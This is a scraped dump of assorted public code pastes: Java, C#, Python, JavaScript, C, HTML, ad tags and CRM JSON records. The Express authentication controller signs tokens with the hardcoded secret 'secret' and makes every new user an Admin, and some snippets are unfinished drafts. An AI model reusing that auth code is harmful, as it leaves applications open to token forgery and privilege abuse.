         sandpiles.z[5 - 3] = sandpiles.z[5 - 3] + 1;
         sandpiles.z[5 + 3] = sandpiles.z[5 + 3] + 1;
    
       }//end of if
      
      if (sandpiles.z[6] >= 4) {
      
         sandpiles.z[6] = sandpiles.z[6] - 4;
         sandpiles.z[6 + 1] = sandpiles.z[6 + 1] +1;
         sandpiles.z[6 - 3] = sandpiles.z[6 - 3] +1;
        
         }//end of if
      
      if (sandpiles.z[7] >= 4) {
      
         sandpiles.z[7] = sandpiles.z[7] - 4;
         sandpiles.z[7 - 1] = sandpiles.z[7 - 1] + 1;
         sandpiles.z[7 + 1] = sandpiles.z[7 + 1] + 1;
         sandpiles.z[7 - 3] = sandpiles.z[7 - 3] + 1;
    
       }//end of if
      
      if (sandpiles.z[8] >= 4) {
      
         sandpiles.z[8] = sandpiles.z[8] - 4;
         sandpiles.z[8 - 1] = sandpiles.z[8 - 1] +1;
         sandpiles.z[8 - 3] = sandpiles.z[8 - 3] +1;
    
       }//end of if
    
  } // end of finalisation() 
    
}   //end of class
"
feqmqYqz,NordFX,reviewbrokers,PHP,Tuesday 26th of March 2024 05:10:43 AM CDT,https://www.reviewbrokers.net/nordfx/
3bz9NaKb,Review Advanced Markets,reviewbrokers,PHP,Tuesday 26th of March 2024 04:53:58 AM CDT,https://www.reviewbrokers.net/review-advanced-markets/
JnK7JMV6,Review Advanced Markets,fxvnpro,PHP,Tuesday 26th of March 2024 04:53:35 AM CDT,https://www.fxvnpro.com/review-advanced-markets/
amMiCgda,Watch.java,NeverRIEght,Java,Tuesday 26th of March 2024 04:50:52 AM CDT,"package section2.exercise2;

class Watch {
    private int hours;

    private int minutes;

    private int seconds;

    public Watch(int hours, int minutes, int seconds) {
        //put your code here
        setHours(hours);
        setMinutes(minutes);
        setSeconds(seconds);
    }

    public Watch() {
        //assign all fields to 0
        //use this() with correct arguments here and in constructors below
        this.hours = 0;
        this.minutes = 0;
        this.seconds = 0;
    }

    public Watch(int hours, int minutes) {
        //assign seconds to 0
        //use this() with correct arguments
        setHours(hours);
        setMinutes(minutes);
        this.seconds = 0;
    }

    public Watch(int hours) {
        //assign minutes and seconds to 0
        //use this() with correct arguments
        setHours(hours);
        this.minutes = 0;
        this.seconds = 0;
    }

    public void update(int hours, int minutes, int seconds) {
        this.hours = this.hours + hours;
        this.minutes = this.minutes + minutes;
        this.seconds = this.seconds + seconds;

        if (this.hours >= 24) {
            this.hours = this.hours % 24;
        } else if(this.hours < 0) {
            this.hours = 24 + this.hours % 24;
        }

        if (this.minutes >= 60) {
            this.minutes = this.minutes % 60;
        } else if(this.minutes < 0) {
            this.minutes = 60 + this.minutes % 60;
        }

        if (this.seconds >= 60) {
            this.seconds = this.seconds % 60;
        } else if(this.seconds < 0) {
            this.seconds = 60 + this.seconds % 60;
        }

        setHours(this.hours);
        setMinutes(this.minutes);
        setSeconds(this.seconds);
    }

    public int getHours() {
        return hours;
    }

    public void setHours(int hours) {
        if (hours >= 0 && hours < 24) {
            this.hours = hours;
        } else {
            this.hours = 0;
        }
    }

    public int getMinutes() {
        return minutes;
    }

    public void setMinutes(int minutes) {
        if (minutes >= 0 && minutes < 60) {
            this.minutes = minutes;
        } else {
            this.minutes = 0;
        }
    }

    public int getSeconds() {
        return seconds;
    }

    public void setSeconds(int seconds) {
        if (seconds >= 0 && seconds < 60) {
            this.seconds = seconds;
        } else {
            this.seconds = 0;
        }
    }

    //do not change the toString() code
    @Override
    public String toString() {
        return String.format(""%d:%02d:%02d"", hours, minutes, seconds);
    }
}
"
2hh30yfL,Untitled,the0938,JavaScript,Tuesday 26th of March 2024 04:45:57 AM CDT,"const CHUNK_SIZE = 1000;

const generateNodeIds = (count) => {
  Boolean(count);
  return [];
};

const generateDbResponse = (nodeIds) => {
  Boolean(nodeIds);
  return [];
};

const makeShouldReturn = (nodesCount) => {
  const title = nodesCount === 0 ? 'an empty array' : 'these node IDs';

  const nodeIds = generateNodeIds(nodesCount);
  const dbResponse = generateDbResponse(nodeIds);

  beforeEach(() => {
    spyOnSelect.mockResolvedValue(dbResponse);
  });

  afterEach(() => {
    spyOnSelect.mockReset();
  });

  it(`it should return ${title}`, async () => {
    const actualIds = await invoke();
    expect(actualIds).toEqual(expectedIds);
  });
};

describe('getNodeIds()', () => {
  describe(`when the database`, () => {
    describe(`contains no nodes`, () => {
      const nodeIds = generateNodeIds(0);
      makeShouldReturn(nodeIds);
    });

    describe(`contains less than one chunk size nodes`, () => {
      const nodeIds = generateNodeIds(Math.round(CHUNK_SIZE * 0.5));
      makeShouldReturn(nodeIds);
    });

    describe(`contains more than one chunk size nodes`, () => {
      const nodeIds = generateNodeIds(CHUNK_SIZE * 2);
      makeShouldReturn(nodeIds);
    });
  });
});
"
L087v6wL,validate password - change form.py,horozov86,Python,Tuesday 26th of March 2024 04:42:29 AM CDT,"from django.contrib.auth.forms import UserCreationForm
from django.core.exceptions import ValidationError
from django.utils.translation import gettext_lazy as _
from django.contrib.auth import get_user_model

UserModel = get_user_model()

class MyHolidayUserCreationForm(UserCreationForm):
    user = None

    def clean_password1(self):
        password1 = self.cleaned_data.get(""password1"")
        self.validate_password(password1)
        return password1

    def validate_password(self, password):
        if len(password) < 6:
            raise ValidationError(_(""Password must be at least 6 characters long.""))

        has_letter = False
        has_digit = False
        has_underscore = False

        for char in password:
            if char.isalpha():
                has_letter = True
            elif char.isdigit():
                has_digit = True
            elif char == '_':
                has_underscore = True

        if not has_letter:
            raise ValidationError(_(""Password must contain at least one letter.""))

        if not has_digit:
            raise ValidationError(_(""Password must contain at least one digit.""))

        if not has_underscore:
            raise ValidationError(_(""Password must contain at least one underscore.""))

    class Meta(UserCreationForm.Meta):
        model = UserModel
        fields = ('email',)
"
Y9V1trn8,KlasaPracownik,cuniszkiewicz,C#,Tuesday 26th of March 2024 04:42:12 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace abstractClass_06_06_2017
{
    class Program
    {
        interface IWorker
        {
            string Name { get; set; }
            string Surname { get; set; }
            void SetSalary(int a);
            void PaySalary();   
        }
        interface IManager
        {
            int ManagerAdd { get; set; }
        }
        abstract class Worker : IWorker
        {
            private string _name;
            private string _surname;
            private int _salary;


            public string Name
            {
                get { return _name; }
                set { _name = value; }
            }
            public string Surname
            {
                get { return _surname; }
                set { _surname = value; }
            }
            public int Salary
            {
                get { return _salary; }
                set
                {
                    if (value > 0)
                        _salary = value;
                    else
                        _salary = 2000;
                }
            }

            public void SetSalary(int p = 2000) { Salary = p; }
            public virtual void PaySalary() { Console.Write(""Salary to pay: "" + Salary + "" zł""); }

            protected Worker()
            {
                SetSalary();
            }
        }

        class Manager : Worker, IWorker, IManager
        {
            private int _managerAdd;
            private int _monthlyBonus;
            public int ManagerAdd
            {
                get { return _managerAdd; }
                set
                {
                    if (value > 0)
                        _managerAdd = value;
                    else
                        _managerAdd = 2000;
                }
            }
            public int MonthlyBonus
            {
                get { return _monthlyBonus; }
                set
                {
                    if (value > 0)
                        _monthlyBonus = value;
                    else
                        _monthlyBonus = 1000;
                }
            }
            public override void PaySalary()
            {
                Console.WriteLine(""Salary to pay: "" + (Salary + ManagerAdd + MonthlyBonus) + "" zł"");
            }
            public Manager()
            {
                ManagerAdd = 2000;
                MonthlyBonus = 1000;
            }

        }

        class Seller : Worker
        {
            private int _monthlyBonus;
            public int MonthlyBonus
            {
                get { return _monthlyBonus; }
                set
                {
                    if (value > 0)
                        _monthlyBonus = value;
                    else
                        _monthlyBonus = 500;
                }
            }
            public override void PaySalary()
            {
                base.PaySalary();
                Console.Write($"" and additional {MonthlyBonus} zł monthly bonus"");
            }
            public Seller()
            {
                MonthlyBonus = 500;
            }
        }

        static void Main(string[] args)
        {
            Manager manager = new Manager();
            manager.PaySalary();
            Seller seller = new Seller();
            seller.PaySalary();

            Console.ReadKey();
        }
    }
}
"
0CKGcKsb,Untitled,Sergey_Maslov_94,C,Tuesday 26th of March 2024 04:22:58 AM CDT,"//*******************************************
ЭТО ВЫПОЛНЯЕТСЯ НА КОМПЕ
//*******************************************

// функция 1
void f_1(int arg_1)
{
    // эта функция чет делает c arg_1
}

// функция 2
void f_2(int arg_2)
{
    // эта тоже чет делает, но с arg_2 
}

int main()
{
   	// общаюсь с ключом. внутри он вызывает сначала f_1(), потом f_2().
	// готовлю их адреса
   	void* ad_1 = &f_1();
   	void* ad_2 = &f_2();
	
	// готовлю их аргументы
	int arg_1;
	int arg_2; 		

	// буферы для общения с ключом
	unsigned char inbuf[];
	unsigned char outbuf[];
	
	// ВОПРОС 1: как корректно запихнуть адреса функции вместе с аргументами в массив char?
	// т.е. inbuff = [ad_1, arg_1, ad_2, arg_2]
	
	// метод отправляет буфер в ключ
	execute(inbuff, outbuff); 
	
	***
}

//*******************************************
ЭТО ВЫПОЛНЯЕТСЯ В КЛЮЧЕ
//*******************************************
// ВОПРОС 2: по видимому нужно завести структуру для тог чтобы разобрать буфер?
struct InData
{
	void* ad_1;
	int arg_1;
	void* ad_2;
	int arg_2;	
};

int main(void)
{
	// Получаем указатель на буфер входных данных
	InData* inBuff  = (InData*)_get_input(); 
	
	// ВОПРОС 3: как преобразовать адрес в функцию? 
	/*		
		void* ad_1 = (*inBuff).ad_1;
		void* ad_2 = (*inBuff).ad_2;
		// ????
		ad_1 => f1()
		ad_2 => f2()
	*/

	// вызываем наши функции с аргументами
	f1(arg_1);
	f2(arg_2);

	res = SES_SUCCESS;

	_set_output(res); 
}
"
NexS9a8Y,Simple Example Image Facing Mouse,Windspar,Python,Tuesday 26th of March 2024 03:18:52 AM CDT,"import pygame

TRANSPARENT = 0, 0, 0, 0

# Image Orientation Matter. Right Side Is Top
def create_triangle(size, color):
    rect = pygame.Rect((0, 0), size)
    surface = pygame.Surface(size, pygame.SRCALPHA)
    surface.fill(TRANSPARENT)
    points = rect.midright, rect.bottomleft, rect.topleft
    pygame.draw.polygon(surface, color, points)
    return surface

def rotate_image(sprite, target):
    vector = pygame.Vector2(target) - sprite.rect.center
    # Second Value Is The Angle
    angle = vector.as_polar()[1]
    # Always Rotate From Original Image. Rotate With Negative Angle Because Topleft Is (0, 0)
    sprite.image = pygame.transform.rotate(sprite.original_image, -angle)
    sprite.rect = sprite.image.get_rect(center=sprite.rect.center)

def main(caption, width, height, flags=0, fps=60):
    # Simple Pygame Setup
    pygame.display.set_caption(caption)
    surface = pygame.display.set_mode((width, height), flags)
    rect = surface.get_rect()
    clock = pygame.time.Clock()
    running = True
    delta = 0
    fps = fps

    # Variables
    background_color = 'black'
    triangle = pygame.sprite.Sprite()
    triangle.image = create_triangle((50, 50), 'dodgerblue')
    triangle.rect = triangle.image.get_rect(center=rect.center)
    triangle.original_image = triangle.image

    # Main Loop
    while running:
        for event in pygame.event.get():
            if event.type == pygame.MOUSEMOTION:
                rotate_image(triangle, event.pos)
            elif event.type == pygame.QUIT:
                running = False

        # Logic

        # Draw
        surface.fill(background_color)
        surface.blit(triangle.image, triangle.rect)

        # Render Buffer To Screen
        pygame.display.flip()
        # Idle And Get Delta Time
        delta = clock.tick(fps)

pygame.init()
main('Facing Towards Mouse', 800, 600)
pygame.quit()
"
52RBrZEX,6.0 Expandable Images,TheiPhoneFan,HTML,Tuesday 26th of March 2024 02:55:41 AM CDT,"<!-- Created by TheiPhoneFan on December 25, 2023 -->
<!-- Previews 6.0, 2022-2024 -->
<!DOCTYPE html>
<html lang=""en"">
<head>
    <!-- External Font -->
    <link href=""https://fonts.googleapis.com/css?family=Roboto:400,300,100,700,900"" rel=""stylesheet"" type=""text/css"">
    <!-- Stylesheet Link -->
    <link rel=""stylesheet"" href=""../theme/style.css"">
    <!-- Page Title -->
    <title>Expandable Images</title>
    <!-- Favicon Image Link -->
    <link rel=""icon"" type=""image/x-png"" href=""tif-logo.png"">
    <!-- Scales Website Content -->
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <!-- Enables Unicode Characters To Display-->
    <meta charset=""UTF-8"">
    <!-- Scripts -->
    <script src=""../scripts/image-model.js""></script>
    <style>
        .image-gallery { /* The Gallery That Holds The Images */
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
        }
        .gallery-image { /* A pointer cursor will display when you hover over the image */
            cursor: pointer;
        }
        .modal { /* The fullscreen popup that shows an expanded view of the image */
            overflow-y: auto;
            display: none;
            position: fixed;
            z-index: 1;
            padding-top: 50px;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.9);
        }
        .modal body {
            overflow: hidden;
        }
        .modal-content { /* The content inside of the .modal */
            display: block;
            margin: auto;
            max-width: 100%;
            max-height: 100%;
            opacity: 1; /* Add this line to ensure the initial opacity is set, fade-out effect */
        }
        .close { /* The close button (x) that can be clicked to close the .modal */
            color: white;
            font-size: 40px;
            font-weight: 400;
            position: absolute;
            top: 10px;
            right: 25px;
            cursor: pointer;
        }
        #modalImage {
            min-width: 350px;
            height:;
        }
    </style>
</head>
<body>
    <noscript>
        <img src=""../theme/critical-error.png"" style=""border-radius:4px;"" width=""30px"">
        Your browser does not support JavaScript or it is disabled. To use all site features, please enable JavaScript or try another browser.
    </noscript>
    
    <div class=""image-gallery"">
        <div class=""image-container"" onclick=""openModal('../previews/images/back-arrow.png', 'Back Arrow')"">
            <img src=""../previews/images/back-arrow.png"" alt=""back arrow"" class=""gallery-image"">
            <figcaption style=""text-align:center;"">
                <button>
                    <a href=""../previews/images/back-arrow.png"" download=""back_arrow.png"">
                        <b>Download</b>
                    </a>
                </button>
            </figcaption>
        </div>
        <div class=""image-container"" onclick=""openModal('../previews/images/house.png', 'House Icon')"">
            <img src=""../previews/images/house.png"" alt=""house icon"" class=""gallery-image"">
            <figcaption style=""text-align:center;"">
                <button>
                    <a href=""../previews/images/house.png"" download=""house_icon.png"">
                        <b>Download</b>
                    </a>
                </button>
            </figcaption>
        </div>
    </div>

    <div id=""modal"" class=""modal"">
        <span class=""close"" onclick=""closeModal()"">&times;</span>
        <img id=""modalImage"" class=""modal-content"" alt=""Enlarged Image"">
    </div>
    <script>
                // Basic JavaScript for the openModal to work
                function openModal(imageSrc) {
            document.getElementById('modalImage').src = imageSrc;
            document.getElementById('modal').style.display = 'block';
            document.body.classList.add('modal-open'); // Add this line

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    closeModal();
                }
            });
        }

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
            document.body.classList.remove('modal-open'); // Add this line
            document.removeEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    closeModal();
                }
            });
        }
    </script>
</body>
</html>"
dZ3252Lm,request.FILES,horozov86,Python,Tuesday 26th of March 2024 02:54:02 AM CDT,"from django.views import generic
from .forms import PlaceCreateForm
from .models import Place

class PlaceCreateView(generic.CreateView):
    form_class = PlaceCreateForm
    model = Place
    template_name = 'destination/place_form.html'
    success_url = reverse_lazy('travelogue_view')

    def form_valid(self, form):
        place = form.save(commit=False)
        place.user = self.request.user
        # Check if a file was uploaded
        if 'photo' in self.request.FILES:
            place.photo = self.request.FILES['photo']
        place.save()
        return super().form_valid(form)
"
N2WMmakV,Путешествия 189669,kirber,JSON,Tuesday 26th of March 2024 02:53:13 AM CDT,"{
  ""Source"": ""crm"",
  ""Message"": """",
  ""Id"": ""3d7597aa-a3db-ee11-b82b-005056b83cbb"",
  ""Type"": ""resend"",
  ""Time"": ""2024-03-25T14:10:24"",
  ""Attributes"": {
    ""createdon"": ""2024-03-06T13:24:29"",
    ""smt_addition_realization_termid"": null,
    ""smt_colorcode"": null,
    ""smt_constructor_groupcode"": 100000002,
    ""smt_default_optionbit"": false,
    ""smt_description"": null,
    ""smt_discount_amount"": -150000.0000,
    ""smt_discount_percent"": null,
    ""smt_discount_typecode"": 100000001,
    ""smt_end_date"": ""2024-12-31T03:00:00"",
    ""smt_group_for_websitecode"": null,
    ""smt_initial_fee"": null,
    ""smt_interest_rate"": null,
    ""smt_marketing_name"": null,
    ""smt_max_quantity"": null,
    ""smt_mortgage_program_validity"": null,
    ""smt_name"": ""Путешествие в ипотеку - 150 000"",
    ""smt_option_classcode"": null,
    ""smt_parent_realization_termid"": {
      ""Id"": ""3b7597aa-a3db-ee11-b82b-005056b83cbb"",
      ""LogicalName"": ""smt_realization_term"",
      ""Name"": ""Путешествие в ипотеку - подопция""
    },
    ""smt_payment_optioncode"": null,
    ""smt_postsale"": null,
    ""smt_realization_term_classifier_smt_isfurnishing"": null,
    ""smt_realization_term_classifierid"": {
      ""Id"": ""52b32ef4-a2db-ee11-b82b-005056b83cbb"",
      ""LogicalName"": ""smt_realization_term_classifier"",
      ""Name"": ""Путешествие в ипотеку""
    },
    ""smt_realization_termid"": ""3d7597aa-a3db-ee11-b82b-005056b83cbb"",
    ""smt_realization_termParent_smt_default_optionbit"": false,
    ""smt_realization_termParent_smt_name"": ""Путешествие в ипотеку - подопция"",
    ""smt_realization_termParent_smt_parent_realization_termid"": {
      ""Id"": ""397597aa-a3db-ee11-b82b-005056b83cbb"",
      ""LogicalName"": ""smt_realization_term"",
      ""Name"": ""Опция Путешествие в ипотеку""
    },
    ""smt_realization_termParent_smt_realization_termid"": ""3b7597aa-a3db-ee11-b82b-005056b83cbb"",
    ""smt_realization_termParent_smt_rejecting_realization_termid"": null,
    ""smt_realization_termParent_smt_required_optionbit"": false,
    ""smt_required_optionbit"": false,
    ""smt_room_for_optioncode"": null,
    ""smt_roomcode"": null,
    ""smt_start_date"": ""2024-02-16T03:00:00"",
    ""smt_stylecode"": null,
    ""smt_technicsbit"": false,
    ""smt_term_typecode"": 100000003,
    ""smt_translate_to_dypricebit"": false,
    ""statecode"": 0,
    ""statuscode"": 1
  },
  ""LinkEntities"": {},
  ""ManyMany"": {}
}"
z0Zz9pM3,ДМС 189673,kirber,JSON,Tuesday 26th of March 2024 02:52:24 AM CDT,"{
  ""Source"": ""crm"",
  ""Message"": """",
  ""Id"": ""3d74c464-4ebf-ed11-b828-005056b81dee"",
  ""Type"": ""resend"",
  ""Time"": ""2024-03-25T14:10:26"",
  ""Attributes"": {
    ""createdon"": ""2023-03-10T17:18:31"",
    ""smt_addition_realization_termid"": null,
    ""smt_colorcode"": null,
    ""smt_constructor_groupcode"": 100000002,
    ""smt_default_optionbit"": false,
    ""smt_description"": null,
    ""smt_discount_amount"": -60000.0000,
    ""smt_discount_percent"": null,
    ""smt_discount_typecode"": 100000001,
    ""smt_end_date"": ""2024-06-30T03:00:00"",
    ""smt_group_for_websitecode"": null,
    ""smt_initial_fee"": null,
    ""smt_interest_rate"": null,
    ""smt_marketing_name"": null,
    ""smt_max_quantity"": null,
    ""smt_mortgage_program_validity"": null,
    ""smt_name"": ""Стоимость На 2 чел. 60 000"",
    ""smt_option_classcode"": null,
    ""smt_parent_realization_termid"": {
      ""Id"": ""3974c464-4ebf-ed11-b828-005056b81dee"",
      ""LogicalName"": ""smt_realization_term"",
      ""Name"": ""Мини ДМС""
    },
    ""smt_payment_optioncode"": null,
    ""smt_postsale"": null,
    ""smt_realization_term_classifier_smt_isfurnishing"": null,
    ""smt_realization_term_classifierid"": {
      ""Id"": ""b2e2a72b-4dbf-ed11-b828-005056b81dee"",
      ""LogicalName"": ""smt_realization_term_classifier"",
      ""Name"": ""ДМС""
    },
    ""smt_realization_termid"": ""3d74c464-4ebf-ed11-b828-005056b81dee"",
    ""smt_realization_termParent_smt_default_optionbit"": false,
    ""smt_realization_termParent_smt_name"": ""Мини ДМС"",
    ""smt_realization_termParent_smt_parent_realization_termid"": {
      ""Id"": ""3774c464-4ebf-ed11-b828-005056b81dee"",
      ""LogicalName"": ""smt_realization_term"",
      ""Name"": ""Опция Мини ДМС""
    },
    ""smt_realization_termParent_smt_realization_termid"": ""3974c464-4ebf-ed11-b828-005056b81dee"",
    ""smt_realization_termParent_smt_rejecting_realization_termid"": null,
    ""smt_realization_termParent_smt_required_optionbit"": false,
    ""smt_required_optionbit"": false,
    ""smt_room_for_optioncode"": null,
    ""smt_roomcode"": null,
    ""smt_start_date"": ""2023-03-10T03:00:00"",
    ""smt_stylecode"": null,
    ""smt_technicsbit"": false,
    ""smt_term_typecode"": 100000003,
    ""smt_translate_to_dypricebit"": null,
    ""statecode"": 0,
    ""statuscode"": 1
  },
  ""LinkEntities"": {},
  ""ManyMany"": {}
}"
trPQj833,controller Auth,cehamot,JavaScript,Tuesday 26th of March 2024 02:40:47 AM CDT,"const { PrismaClient } = require('@prisma/client');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const prismaClient = new PrismaClient();

module.exports = {
  // signin
  signin: async (req, res, next) => {
    try {
      const { email, password } = req.body;

      const checkUser = await prismaClient.user.findUnique({
        where: {
          email: email,
        },
      });
      if (checkUser) {
        const checkPassword = bcrypt.compareSync(password, checkUser.password);

        if (checkPassword) {
          const token = jwt.sign(
            {
              user: {
                id: checkUser.id,
                name: checkUser.name,
                email: checkUser.email,
                role: checkUser.role,
              },
            },
            'secret'
          );
          res.status(200).json({ message: 'Success Signin', data: token });
        } else {
          res.status(403).json({ message: 'Password not match' });
        }
      } else {
        res.status(403).json({ message: 'Email not found' });
      }
    } catch (err) {
      console.log(err);
      next(err);
    }
  },
  // end

  // signup
  signup: async (req, res, next) => {
    try {
      const { name, email, password, confirmPassword } = req.body;
      if (password !== confirmPassword) {
        res.status(403).json({ message: 'Password not match' });
      }

      const checkEmail = await prismaClient.user.findUnique({
        where: {
          email: email,
        },
      });
      if (checkEmail) {
        return res.status(403).json({ message: 'Email already exists' });
      }

      const user = await prismaClient.user.create({
        data: {
          name,
          email,
          password: bcrypt.hashSync(password, 10),
          role: 'Admin',
        },
      });
      delete user.password;
      res.status(200).json({ message: 'Success Signup', data: user });
    } catch (err) {
      next(err);
    }
  },
  // end

  signout: async (req, res, next) => {
    try {
      res.status(200).json({ message: 'Signout successful' });
    } catch (err) {
      next(err);
    }
  },
};"
0E2VfunF,sibnet.ru: SPA - LST-2635,Luxup,HTML,Tuesday 26th of March 2024 02:21:12 AM CDT,"<!-- Topline 980x90 --!>
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/199124/360_light.js""></script>
<div id='lx_718266_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_718266_wrapper', '_199124', '_718266');});
</script>
</div>

<!-- 240x400 sidebar --!>
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/199124/360_light.js""></script>
<div id='lx_718265_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_718265_wrapper', '_199124', '_718265');});
</script>
</div>"
Gkrg4Fy6,Binary search,nathanwailes,Python,Tuesday 26th of March 2024 02:02:01 AM CDT,"def binary_search_recursive(array, target):
    return binary_search_helper(array, target, 0, len(array)-1)

def binary_search_helper(array, target, left, right):
    if left > right:
        return -1
    middle = (left+right) // 2
    potential_match = array[middle]
    if target == potential_match:
            return middle
    elif target < potential_match:
        return binary_search_helper(array, target, left, middle - 1)
    else:
        return binary_search_helper(array, target, middle + 1, right)

def binary_search_iterative(array, target):
    left, right = 0, len(array)-1
    while left <= right:
        middle = (left+right) // 2
        potential_match = array[middle]
        if target == potential_match:
            return middle
        elif target < potential_match:
            right = middle - 1
        else:
            left = middle + 1
    return -1

# Example usage
arr = [2, 3, 4, 10, 40]
target = 10
print(binary_search_iterative(arr, target))  # Output: 3"
iKVd9SPN,6.0.3 Expandable Images,TheiPhoneFan,HTML,Tuesday 26th of March 2024 02:01:44 AM CDT,"<!-- Created by TheiPhoneFan on 2024-03-26 -->
<!-- Previews 6.0.3, 2022-2024 -->
<!DOCTYPE html>
<html lang=""en"">
<head>
    <!-- External Font -->
    <link href=""https://fonts.googleapis.com/css?family=Roboto:400,300,100,700,900"" rel=""stylesheet"" type=""text/css"">
    <!-- Stylesheet Link -->
    <link rel=""stylesheet"" href=""../theme/style.css"">
    <!-- Page Title -->
    <title>Expandable Images</title>
    <!-- Favicon Image Link -->
    <link rel=""icon"" type=""image/x-png"" href=""../logos/tif-logo.png"">
    <!-- Scales Website Content -->
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <!-- Enables Unicode Characters To Display-->
    <meta charset=""UTF-8"">
    <style>
        .image-gallery { /* The Gallery That Holds The Images */
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
        }
        .gallery-image { /* A pointer cursor will display when you hover over the image */
            cursor: pointer;
        }
        .modal { /* The fullscreen popup that shows an expanded view of the image */
            display: none;
            position: fixed;
            padding-top: 50px;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.9);
        }
        .modal-content { /* The content inside of the .modal */
            display: block;
            margin: auto;
        }
        .close { /* The close button (x) that can be clicked to close the .modal */
            color: white;
            font-size: 40px;
            position: absolute;
            top: 10px;
            right: 25px;
            cursor: pointer;
        }
        #modalImage { /* The image inside the .image-container */
            max-width: 100%;
            width: 250px;
        }
    </style>
</head>
<body class=""white-bg"">
    <noscript>
        <img src=""../theme/critical-error.png"" style=""border-radius:4px;"" width=""30px"">
        Your browser does not support JavaScript or it is disabled. To use all site features, please enable JavaScript or try another browser.
    </noscript>
    
    <div class=""image-gallery"">
        <div class=""image-container"" onclick=""openModal('../previews/images/back-arrow.png', 'Back Arrow')"">
            <img src=""../previews/images/back-arrow.png"" alt=""back arrow"" class=""gallery-image"">
        </div>
        <div class=""image-container"" onclick=""openModal('../previews/images/house.png', 'House Icon')"">
            <img src=""../previews/images/house.png"" alt=""house icon"" class=""gallery-image"">
        </div>
    </div>

    <div id=""modal"" class=""modal"">
        <span class=""close"" onclick=""closeModal()"">&times;</span>
        <img id=""modalImage"" class=""modal-content"" alt=""Enlarged Image"">
    </div>

    <script>
                // Basic JavaScript for the openModal to work
                function openModal(imageSrc) {
            document.getElementById('modalImage').src = imageSrc;
            document.getElementById('modal').style.display = 'block';
            document.body.classList.add('modal-open'); // Add this line

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    closeModal();
                }
            });
        }

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
            document.body.classList.remove('modal-open'); // Add this line
            document.removeEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    closeModal();
                }
            });
        }
    </script>
</body>
</html>"
